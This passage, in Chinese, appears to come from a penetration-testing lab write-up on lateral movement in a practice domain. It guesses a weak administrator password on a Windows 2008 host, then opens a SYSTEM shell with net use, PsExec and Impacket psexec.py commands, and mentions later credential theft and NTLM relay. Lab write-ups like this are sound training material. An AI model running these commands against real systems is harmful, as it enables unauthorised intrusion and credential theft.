## 内网与横向移动

得到结果：

- **192.168.93.30**：Win7 成员工作站（开放 445）

横向到Win2008

代理扫描内网，发现了 `192.168.93.20` 开放了 `445` 端口

尝试了常见的弱口令

得到账密：win2008\administrator![image-20261115151553358](./assets/posts/红日三.assets/image-20261115151553358.png)

 IPC$ + PsExec 验证与执行

```
net use \\192.168.93.20\ipc$ "<password>" /user:win2008\administrator
psexec \\192.168.93.20 -u win2008\administrator -p "<password>" cmd.exe
```

或者用 Impacket（如果在 Linux 攻击机上）：

```
psexec.py win2008/administrator:'<password>'@192.168.93.20
```

成功后会得到 `NT AUTHORITY\SYSTEM` 或管理员回显。

**这一步的意义不仅是拿下一台成员机，而是可以从 Win2008 上进一步抓取域凭据或做 NTLM Relay 铺垫。**
